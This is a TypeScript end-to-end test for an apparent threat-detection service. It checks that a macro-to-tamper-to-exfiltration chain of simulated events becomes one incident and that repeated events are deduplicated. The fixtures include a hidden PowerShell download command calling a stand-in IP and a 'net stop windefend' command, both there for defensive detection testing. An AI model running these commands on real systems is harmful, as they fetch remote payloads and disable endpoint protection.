import { createServer, type Server } from "node:http";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { loadRules } from "./rules/loader.js";
import { RuleEngine } from "./rules/engine.js";
import { AlertDeduper } from "./rules/dedup.js";
import { Correlator } from "./correlation/correlator.js";
import { Store } from "./store.js";
import { Broadcaster } from "./broadcast.js";
import { createApp } from "./app.js";

const here = path.dirname(fileURLToPath(import.meta.url));
const repoRulesDir = path.resolve(here, "..", "..", "..", "rules");

let server: Server;
let broadcaster: Broadcaster;
let baseUrl: string;

beforeAll(async () => {
  const rules = loadRules(repoRulesDir);
  const app = createApp({
    engine: new RuleEngine(rules),
    deduper: new AlertDeduper(rules),
    correlator: new Correlator(900),
    store: new Store(),
    broadcaster: (broadcaster = new Broadcaster((server = createServer()))),
  });
  server.on("request", app);
  await new Promise<void>((resolve) => server.listen(0, resolve));
  const address = server.address();
  baseUrl = `http://127.0.0.1:${typeof address === "object" && address ? address.port : 0}`;
});

afterAll(async () => {
  broadcaster.close();
  await new Promise<void>((resolve, reject) =>
    server.close((err) => (err ? reject(err) : resolve())),
  );
});

async function ingest(parser: string, event: unknown) {
  const res = await fetch(`${baseUrl}/api/ingest`, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({ parser, event }),
  });
  expect(res.status).toBe(200);
  return res.json() as Promise<{
    event: { id: string };
    alerts: Array<{ id: string; ruleId: string; count: number }>;
    incidents: Array<{ id: string; alertIds: string[]; severity: string; stageCount: number }>;
  }>;
}

describe("ingest pipeline end-to-end (no MongoDB)", () => {
  it("builds a multi-stage incident from a macro → tamper → exfil chain and dedupes repeats", async () => {
    const officeSpawn = {
      ts: new Date().toISOString(),
      hostname: "ws-042",
      parentImage: "C:\\Program Files\\Microsoft Office\\WINWORD.EXE",
      image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      commandLine: "powershell.exe -nop -w hidden -c iwr http://198.51.100.7/s",
      user: "CORP\\jdoe",
    };
    const stage1 = await ingest("edr-process", officeSpawn);
    expect(stage1.alerts.map((a) => a.ruleId)).toEqual(["WARDEN-0005"]);
    expect(stage1.incidents).toHaveLength(0);

    const stage2 = await ingest("edr-process", {
      ts: new Date().toISOString(),
      hostname: "ws-042",
      parentImage: "C:\\Windows\\System32\\cmd.exe",
      image: "C:\\Windows\\System32\\net.exe",
      commandLine: "net stop windefend",
      user: "CORP\\jdoe",
    });
    expect(stage2.alerts.map((a) => a.ruleId)).toEqual(["WARDEN-0008"]);
    expect(stage2.incidents).toHaveLength(1);
    expect(stage2.incidents[0]!.stageCount).toBe(2);
    expect(stage2.incidents[0]!.severity).toBe("critical");

    const stage3 = await ingest("generic-json", {
      timestamp: new Date().toISOString(),
      source: "firewall",
      action: "network_connection",
      host: "ws-042",
      dest_ip: "198.51.100.7",
      dest_port: 443,
      bytes_out: 80_000_000,
    });
    expect(stage3.alerts.map((a) => a.ruleId)).toEqual(["WARDEN-0007"]);
    expect(stage3.incidents).toHaveLength(1);
    const incident = stage3.incidents[0]!;
    expect(incident.id).toBe(stage2.incidents[0]!.id);
    expect(incident.alertIds).toEqual([
      stage1.alerts[0]!.id,
      stage2.alerts[0]!.id,
      stage3.alerts[0]!.id,
    ]);
    expect(incident.stageCount).toBe(3);

    const repeat = await ingest("edr-process", {
      ...officeSpawn,
      ts: new Date().toISOString(),
    });
    expect(repeat.alerts).toHaveLength(0);
    expect(repeat.incidents).toHaveLength(0);

    const alerts = (await (await fetch(`${baseUrl}/api/alerts`)).json()) as Array<{
      ruleId: string;
      count: number;
    }>;
    expect(alerts).toHaveLength(3);
    expect(alerts.find((a) => a.ruleId === "WARDEN-0005")!.count).toBe(2);

    const incidents = (await (await fetch(`${baseUrl}/api/incidents`)).json()) as Array<{
      alertIds: string[];
    }>;
    expect(incidents).toHaveLength(1);
    expect(incidents[0]!.alertIds).toHaveLength(3);

    const events = (await (await fetch(`${baseUrl}/api/events`)).json()) as unknown[];
    expect(events).toHaveLength(4);
  });
});
